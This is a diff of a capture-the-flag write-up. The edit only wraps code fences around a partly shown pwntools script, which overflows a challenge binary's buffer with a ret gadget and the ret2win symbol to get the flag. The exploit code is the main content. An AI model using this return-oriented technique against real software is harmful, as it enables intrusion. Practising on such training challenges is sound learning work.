@@ -23,7 +23,7 @@ We found it with ropper
 ![Alt Text](img/ret_gadget.png)
 
 After these we wrote a simply python script with pwntools and we took the flag!
-
+```python
 #!/usr/bin/env python3 
 from pwn import *
 
@@ -38,7 +38,7 @@ payload = flat(
         ret_gadget,
         elf.symbols.ret2win
         )
-
+```
 p.sendlineafter(b'>', payload)
 success(p.recvall())
 
